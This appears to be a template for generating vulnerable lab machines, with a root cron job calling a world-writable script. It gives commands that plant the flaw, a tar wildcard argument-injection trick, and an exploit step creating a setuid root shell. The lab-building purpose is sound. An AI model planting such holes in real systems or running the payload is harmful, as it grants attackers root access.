---
id: cron_job_hijack
description: Configures a root-owned cron job that invokes a script or binary writable by a low-privilege user, enabling privilege escalation.
required_vars: [cron_schedule, script_path, username]
---
# Atom: Cron Job Hijack
A root cron job calls a script or binary that is writable by a low-privilege user, allowing that user to replace it with arbitrary code that executes as root.

### Logic Requirements:
1. Create the target script at `<script_path>` with some benign default content.
2. Set weak permissions on the script so a low-priv user can overwrite it: `chmod 777 <script_path>` or `chown <username>:<username> <script_path>`.
3. Add a root cron entry that invokes the script on `<cron_schedule>`: `echo "<cron_schedule> root <script_path>" >> /etc/cron.d/maintenance`

### Common Patterns:
- **Writable Script Invoked by Root Cron:**
  ```bash
  echo '#!/bin/bash\necho ok' > /opt/cleanup.sh
  chmod 777 /opt/cleanup.sh
  echo "* * * * * root /opt/cleanup.sh" > /etc/cron.d/cleanup
  ```
- **Wildcard Expansion (tar/rsync):**
  A cron job runs `tar czf /backup/archive.tar.gz *` or `rsync -a * /backup/` inside a directory writable by a low-priv user. The attacker places files named `--checkpoint=1` and `--checkpoint-action=exec=sh payload.sh` to inject arguments via glob expansion.
  ```bash
  mkdir -p /opt/backups
  chmod 777 /opt/backups
  echo "* * * * * root cd /opt/backups && tar czf /tmp/backup.tar.gz *" > /etc/cron.d/backup
  ```
- **Writable Binary (PATH Hijack via Cron):**
  Cron calls a binary by relative name and the PATH in the cron environment includes a writable directory first.

### Testing Guidance:
1. Verify the cron entry exists: `cat /etc/cron.d/<cron_name>`
2. Verify the script permissions: `ls -l <script_path>` — the low-priv user must be able to write to it.
3. As the low-priv user, overwrite the script with a payload: `echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > <script_path>`
4. Wait for the cron to fire (or advance system time in test), then verify: `ls -l /tmp/rootbash` and `/tmp/rootbash -p -c 'id'`

### Synthesis Guidance:
Generate commands to create the benign script, set weak permissions, and install the cron entry. Choose a `script_path` that sounds like a plausible maintenance task (e.g. `/opt/cleanup.sh`, `/usr/local/bin/check_disk.sh`). The schedule should be frequent enough to be quickly exploitable in a lab (e.g. `* * * * *`). For wildcard expansion scenarios, the Synthesis agent should note in a comment that the attacker needs to create specially named files in the watched directory.
